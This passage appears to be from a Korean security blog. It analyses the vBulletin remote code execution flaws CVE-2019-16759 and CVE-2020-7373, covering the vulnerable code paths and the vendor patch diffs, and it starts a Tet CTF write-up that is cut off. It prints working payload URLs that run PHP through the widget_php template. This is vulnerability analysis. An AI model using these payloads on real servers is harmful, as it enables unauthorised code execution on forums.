class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;actionRender&#x27;</span>, <span class="string">&#x27;arguments&#x27;</span> =&gt; <span class="variable">$params</span>,</span><br><span class="line">            <span class="string">&#x27;template&#x27;</span> =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>));</span><br><span class="line">        Api_InterfaceAbstract::setLight();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$params</span>));</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>callRender 메서드를 보면 $routeInfo에 explode() 메서드를 이용해서 <code>$_REQUEST[&#39;routestring&#39;]</code>의 값을 슬래쉬를 기준으로 잘라 배열로 만들어주고, $params에는 array_merge 메서드를 이용해서 Query String 값과 Raw Data 값을 합쳐 하나의 배열로 만드는 것을 볼 수 있습니다.<br>그리고 $routeInfo[2]의 값과 $params의 값을 템플릿으로 전송하는 것을 볼 수 있습니다.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// core/install/vbulletin-style.xml</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_php&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1372889589&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin Solutions&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.0.5 Release Canddate 1&quot;</span>&gt;</span>&lt;![CDATA[&lt;</span><br><span class="line">        vb:if condition=&quot;empty(widgetConfig) AND !empty($widgetinstaceid)&quot;&gt;</span><br><span class="line">    &#123;vb:data widgetConfig, widget, fetchConfig, (vb:raw widgetinstanceid)&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line">&lt;vb:if condition=&quot;!empty($widgetConfig)&quot;&gt;</span><br><span class="line">    &#123;vb:set widgetid, &#123;vb:raw widgetConfig.widgetid&#125;&#125;</span><br><span class="line">    &#123;vb:set widgetinstanceid, &#123;vb:raw widgetConfig.widgetinstanceid&#125;&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;canvax-widget default-widget custtom-html-widget&quot; data-widget-id=&quot;&#123;vb:raw widgetid&#125;&quot; data-widget-instance-id=&quot;&#123;vb:raw widgetinstanceid&#125;&quot;&gt;</span><br><span class="line">    &#123;vb:template module_title, widgetConfig=&#123;vb:raw widgetConfig&#125;, can_use_sitebuilder=&#123;vb:raw user.can_use_sitebuilder&#125;&#125;</span><br><span class="line">    &lt;div class=&quot;widget-header-divder&quot; /&gt;</span><br><span class="line">        &lt;hr class=&quot;widget-header-divider&quot; /&gt;</span><br><span class="line">        &lt;vb:if condition=&quot;!empty($widgetConfig[&#x27;code&#x27;]) AND !$vboptions[&#x27;disable_php_rendering&#x27;]&quot;&gt;</span><br><span class="line">            &#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">            &#123;vb:raw $evaledPHP&#125;</span><br><span class="line">        &lt;vb:else /&gt;</span><br><span class="line">            &lt;vb:if condition=&quot;$user[can_use_sitebuilder&#x27;]&quot;&gt;</span><br><span class="line">                &lt;span class=&quot;note&quot;&gt;&#123;vb:phrase click_edit_to_config_module&#125;&lt;/span&gt;</span><br><span class="line">            &lt;/vb:if&gt;</span><br><span class="line">        &lt;/vb:if&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>widget_php 템플릿을 확인해보면 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 비어있지 않고, <code>!$vboptions[&#39;disable_php_rendering&#39;]</code>가 비활성화 되어 있으면 다음 코드를 코드를 실행하는 것을 볼 수 있습니다.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">&#123;vb:raw $evaledPHP&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/controller/bbcode.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evalCode</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>evalCode 메서드는 <code>includes/vb5/frontend/controller/bbcode.php</code> 내에 정의하고 있고, eval 함수를 이용해서 $code 값을 실행시키고, <code>$output</code> 값을 리턴해주는 것을 볼 수 있습니다.</p><p>결론적으로 RCE를 트리거 하기 위해서는 <code>includes/vb5/frontend/applicationlight.php</code>에서 <code>isQuickRoute</code> 메서드에서 rotuestring의 값이 ‘ajax/render’여야 하고, callRender에서 $routeInfo[2]의 값은 <code>&#39;widget_php&#39;</code>여야 하고, <code>widget_php</code> 템플릿에서는 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 존재해야 하고, eval 함수의 인자 값으로도 <code>$widgetConfig[&#39;code&#39;]</code>가 들어갑니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line"><span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">print_r(<span class="variable">$routeInfo</span>);</span><br><span class="line">print_r(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">input  : http:<span class="comment">//141.164.52.207/?routestring=ajax/render/widget_php&amp;widgetConfig[&#x27;code&#x27;]=phpinfo();</span></span><br><span class="line">output : <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; ajax [<span class="number">1</span>] =&gt; render [<span class="number">2</span>] =&gt; widget_php ) <span class="keyword">Array</span> ( [routestring] =&gt; ajax/render/widget_php [widgetConfig] =&gt; <span class="keyword">Array</span> ( [<span class="string">&#x27;code&#x27;</span>] =&gt; phpinfo(); ) )</span><br></pre></td></tr></table></figure><p>그리고 사용자 값을 받을 때, <code>$_REQUEST</code>를 이용해서 받아 오기 때문에 GET, POST 메서드를 이용해서 공격을 수행할 수 있습니다. 그러니 GET으로 익스를 하려면 위와 같이 그냥 값을 넘겨 주게 되면 <code>substr($_REQUEST[&#39;routestring&#39;], 0, 11)</code>의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 참이 반환되는 동시에 <code>vB5_Frontend_ApplicationLight::init</code>가 실행 돼 <code>__construct</code> 메서드가 실행이 될 것이고, <code>__construct</code> 메서드에서도 <code>substr($_REQUEST[&#39;routestring&#39;], 0, 11)</code>의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 handler를 callRender로 설정하게 됩니다. callRender 메서드에서는 routeInfo[2]의 값으로는 <code>&#39;widget_php&#39;</code>, widgetConfig[‘code’]의 값으로는 <code>&#39;phpinfo();&#39;</code>가 들어가 있어 2개의  <code>widget_php</code> 템플릿으로 전송이 됩니다. <code>widget_php</code>에서는 widgetConfig[‘code’]가 비어있지 않기 때문에 evalCode로 widgetConfig[‘code’]가 전송이 되어 phpinfo(); 함수가 실행이 되며 RCE가 성공적으로 트리거 되게 됩니다.</p><hr><h2 id="CVE-2019-16759-Patch"><a href="#CVE-2019-16759-Patch" class="headerlink" title="CVE-2019-16759 Patch"></a>CVE-2019-16759 Patch</h2><p>CVE-2019-16759 취약점은 총 2개의 패치가 이루어졌다고 합니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      Remove any problematic values from the template</span></span><br><span class="line"><span class="comment"> *      variable arrays before rendering</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//for now don&#x27;t pass the values through.  These arrays are potentially large</span></span><br><span class="line"><span class="comment">//and we don&#x27;t want to make unnecesary copies.  The alternative is to pass by</span></span><br><span class="line"><span class="comment">//reference which causes it&#x27;s own headaches.  It&#x27;s an internal function and the</span></span><br><span class="line"><span class="comment">//relevant arrays are all class variables.</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanRegistered</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">        <span class="variable">$disallowedNames</span> = <span class="keyword">array</span>(<span class="string">&#x27;widgetConfig&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$disallowedNames</span> <span class="keyword">AS</span> <span class="variable">$name</span>)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;registered[<span class="variable">$name</span>]);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="built_in">self</span>::<span class="variable">$globalRegistered</span>[<span class="variable">$name</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>첫  패치는 <code>clearRegistered</code>라는 함수를 이용해서 widgetConfig라는 값이 사용되면 <code>unset()</code> 함수를 이용해서 제거하고 있습니다. 그러니 Query String 이나 Raw Data로 <code>widgetConfig[&#39;code&#39;]=phpinfo();</code>라는 값이 들어오게 되면 widgetConfig가 존재하기 때문에 <code>unset()</code>에 의해서 제거가 될 것 입니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.356918994</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.577517014</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-286</span>,<span class="number">20</span> +<span class="number">286</span>,<span class="number">32</span> @@</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;render&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">-<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">-<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">-<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">-<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>],</span><br><span class="line">-<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">-<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">-<span class="comment">// not sending the data to the template</span></span><br><span class="line">-<span class="comment">// render</span></span><br><span class="line">-<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">-));</span><br><span class="line">-Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$templateName</span> = <span class="variable">$routeInfo</span>[<span class="number">2</span>];</span><br><span class="line">+<span class="keyword">if</span> (<span class="variable">$templateName</span> == <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;css_links&#x27;</span> =&gt; <span class="keyword">array</span>(),</span><br><span class="line">+);</span><br><span class="line">+&#125;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$templateName</span>,</span><br><span class="line">+<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">+<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">+<span class="comment">// not sending the data to the template</span></span><br><span class="line">+<span class="comment">// render</span></span><br><span class="line">+<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">+));</span><br><span class="line">+Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$result</span> = vB5_Template::staticRenderAjax(<span class="variable">$templateName</span>, <span class="variable">$serverData</span>);</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$serverData</span>));</span><br><span class="line">+<span class="keyword">$this</span>-&gt;sendAsJson(<span class="variable">$result</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br></pre></td></tr></table></figure><p>그리고 두 번째 패치는 <code>$routeInfo[2]</code>(Template Name)의 값으로 <code>widget_php</code>가 들어오게 되면 빈 템플릿과 CSS를 반환하도록 하는 조건문을 추가함으로 0-day에 대응하게 되었습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.276913797</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.493511575</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-12</span>,<span class="number">6</span> +<span class="number">12</span>,<span class="number">26</span> @@</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">vB5_Template_Runtime</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">+<span class="comment">//This is intended to allow the runtime to know that template it is rendering.</span></span><br><span class="line">+<span class="comment">//It&#x27;s ugly and shouldn&#x27;t be used lightly, but making some features widely</span></span><br><span class="line">+<span class="comment">//available to all templates is uglier.</span></span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$templates</span> = <span class="keyword">array</span>();</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">startTemplate</span>(<span class="params"><span class="variable">$template</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_push(<span class="built_in">self</span>::<span class="variable">$templates</span>, <span class="variable">$template</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">endTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_pop(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">currentTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="keyword">return</span> end(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$units</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;px&#x27;</span>,</span><br><span class="line">@@ <span class="number">-1944</span>,<span class="number">6</span> +<span class="number">1964</span>,<span class="number">21</span> @@</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;&lt;div style=&quot;border:1px solid red;padding:10px;margin:10px;&quot;&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$timerName</span>) . <span class="string">&#x27;: &#x27;</span> . <span class="variable">$elapsed</span> . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">evalPhp</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="comment">//only allow the PHP widget template to do this.  This prevents a malicious user</span></span><br><span class="line">+<span class="comment">//from hacking something into a different template.</span></span><br><span class="line">+<span class="keyword">if</span> (<span class="built_in">self</span>::currentTemplate() != <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">+&#125;</span><br><span class="line">+ob_start();</span><br><span class="line">+<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">+<span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">+ob_end_clean();</span><br><span class="line">+<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">+&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>또한 evalPhP 메서드의 현재 템플릿이 widget_php가 아니면 Null을 반환하도록 하는 조건문을 추가해서, 다른 템플릿에서 악용될 요소도 제거하는 것을 볼 수 있습니다. (Line 342 ~ 345)</p><p>이와 같이 총 2곳을 패치해서 0-day 취약점을 제거했지만 약 1년 정도가 지나고 한 보안 연구원에 의해서 우회가 돼 0-day가 다시 나오게 되었습니다.</p><hr><h2 id="CVE-2020-7373"><a href="#CVE-2020-7373" class="headerlink" title="CVE-2020-7373"></a><em>CVE-2020-7373</em></h2><p><code>CVE-2020-7373</code>은 <code>CVE-2019-16759</code>를 패치한 것을 우회해 다시 RCE 취약점을 트리거 한 0-day 입니다. 해당 취약점은 본례의 익스 방식과 크게 다를 게 없지만 다르다면 템플릿을 <code>widget_php</code>가 아닌 <code>widget_tabbedcontainer_tab_panel</code>이라는 템플릿을 이용해서 익스를 진행하였습니다.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_tabbedcontainer_tab_panel&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1532130449&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.4.4 Alpha 2&quot;</span>&gt;</span>&lt;![CDATA[&#123;vb:set panel_id, &#123;vb:concat &#123;vb:var id_prefix&#125;, &#123;vb:var tab_num&#125;&#125;&#125;</span><br><span class="line">&lt;div id=&quot;&#123;vb:var panel_id&#125;&quot; class=&quot;h-clearfix js-show-on-tabs-create h-hide&quot;&gt;</span><br><span class="line">&lt;vb:comment&gt;</span><br><span class="line">- &#123;vb:var panel_id&#125; </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;-- &#123;vb:raw subWidget.template&#125;</span><br><span class="line">&lt;/vb:each&gt;</span><br><span class="line">&lt;/vb:comment&gt;</span><br><span class="line"> </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&#123;vb:template &#123;vb:raw subWidget.template&#125;, </span><br><span class="line">widgetConfig=&#123;vb:raw subWidget.config&#125;, </span><br><span class="line">widgetinstanceid=&#123;vb:raw subWidget.widgetinstanceid&#125;,</span><br><span class="line">widgettitle=&#123;vb:raw subWidget.title&#125;, </span><br><span class="line">tabbedContainerSubModules=&#123;vb:raw subWidget.tabbedContainerSubModules&#125;,</span><br><span class="line">product=&#123;vb:raw subWidget.product&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/vb:each&gt; </span><br><span class="line">&lt;/div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>widget_tabbedcontainer_tab_panel</code> 템플릿은 자식 템플릿을 생성해주는 템플릿이라고 합니다. 하단의 보면 subWidget.template를 이용해서 템플릿 이름을 정하고, {vb:raw subWidget.config}를 이용해서 widgetConfig에 값을 넣어주는 것을 볼 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC : http:&#x2F;&#x2F;141.164.52.207&#x2F;?subWidgets[0][template]&#x3D;widget_php&amp;subWidgets[0][config][code]&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p>그러니 위와 같이 subWidget.template의 값으로 <code>widget_php</code>, subWidget.config의 값으로 <code>code:phpinfo();</code>로 넘겨주면 template의 값은 <code>widget_php</code>, widgetConfig.code의 값은 <code>phpinfo();</code>가 될 것 이고, widget_php 템플릿이 생성되면 widgetConfig[‘code’]의 값은 <code>phpinfo();</code>이므로 <code>widget_php</code>에서 <code>CVE-2019-16759</code>와 동일하게 RCE가 트리거 되게 됩니다.</p><hr><h2 id="CVE-2020-7373-Patch"><a href="#CVE-2020-7373-Patch" class="headerlink" title="CVE-2020-7373 Patch"></a>CVE-2020-7373 Patch</h2><p><strong>패치 코드가 안 보임</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> Analysis </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 0-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tet CTF 2021 Write Up</title>
      <link href="2021/01/03/2021-01-03-TetCTF/"/>
      <url>2021/01/03/2021-01-03-TetCTF/</url>
      
        <content type="html"><![CDATA[<p><strong>2021년 1월 1일 오전 9시부터 Tet CTF라는 대회가 열렸습니다. 그래서 이번 대회에서 출제된 SQL Injectino 문제의 풀이를 작성해보겠습니다. 사실 대회는 2일동안 진행했는데 1시간도 안 했음,, 게임 한다고,,</strong></p><hr><p><b><em><span style="color:#21C587">&#35;</span> mysqlimit [100pts]</em></b><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 